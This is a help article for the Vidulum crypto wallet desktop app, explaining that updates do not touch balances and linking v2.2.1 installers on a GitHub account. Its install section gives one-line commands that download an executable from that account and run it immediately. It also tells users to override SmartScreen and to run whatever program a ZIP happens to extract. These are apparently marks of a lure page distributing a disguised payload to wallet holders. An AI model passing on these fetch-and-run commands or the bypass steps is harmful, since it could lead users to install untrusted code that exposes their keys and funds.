![Vidulum](../assets/banner-article.png)

# Vidulum Wallet Update: Replacing the Program, Not the Wallet

Why an update cannot empty a balance, and what to do if the new build will not start.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

The [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) page is the only place to get the build you update to.

> An update replaces the application. It does not touch the chain, and it cannot move your coins.

An update swaps the program that reads your wallet; the wallet itself lives in the keys on your machine and the balances on-chain. That is why updating cannot empty a balance, and why the coins do not need to be "sent" anywhere first. The fear that blocks updates is understandable and unfounded, and staying on an old build causes a different set of problems.

<!-- ARTICLE-BODY-BEGIN -->

## What actually changes

The executable is replaced. Your keys stay where they are, and your balances stay on the chains they were already on. A new build changes how the wallet reads and presents that state; it does not create or destroy it.

This is also why a version number is not a backup strategy. If the phrase is safe, the build is replaceable. If the phrase is not safe, no build will save you.

## Before you update

1. Confirm you have your recovery phrase written down and readable.
2. Note the addresses you expect to see, so you can compare afterwards.
3. Download the installer from the release page for your platform.
4. Close the running application before replacing it.
5. Install over the existing build, then open it and check the balances.

That list takes a few minutes and answers the question people actually have: will my balance still be there? It will, and now you will know how to prove it.

## If the new build will not open

| Symptom | Likely cause | What to try |
| --- | --- | --- |
| Nothing happens on launch | Partial install or blocked by the OS | Reinstall the current release over the existing install |
| Blank window | Stale application data | Reinstall, then reopen; the wallet data itself is separate |
| Blocked by the operating system | First-launch protection | Allow the app for this user, then open again |
| Opens, but a balance is missing | Cached view after a chain change | Refresh that chain and compare against an explorer |

Reinstalling over an existing install is safe for your keys. If the wallet data still does not appear, restore from the phrase into a clean install rather than reinstalling repeatedly.

Installer sources are covered in <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md">Vidulum Wallet download for Windows, macOS and Linux</a>, which lists the official builds.

## Why staying on an old build causes problems

A chain upgrade can change what a wallet must read. A build older than the change can show stale balances or fail to send, and the error looks like a wallet fault rather than an age problem.

That is the reason updating is the first step in most troubleshooting guides here, including the send and balance pages. It is not a way to dodge a diagnosis; it removes the most common cause of one.

A <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> is the fallback if the wallet data is missing.

A balance that will not refresh after an update is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md">Vidulum balance not showing received coins</a>.

Update from the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> page only, never a third-party mirror.

## FAQ

### Will updating delete my coins?

No. Balances are on-chain and keys are local. The update replaces the program.

### Do I need to restore after updating?

No, if the install is in place. Restore only if the wallet data is missing.

### Will I lose my phrase?

The phrase is not part of the install. Write it down regardless of updates.

### Can I skip versions?

Yes. Install the current release directly; there is no need to step through older builds.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Wallet download](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md) - [Restore from a phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md) - [Balance not showing](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
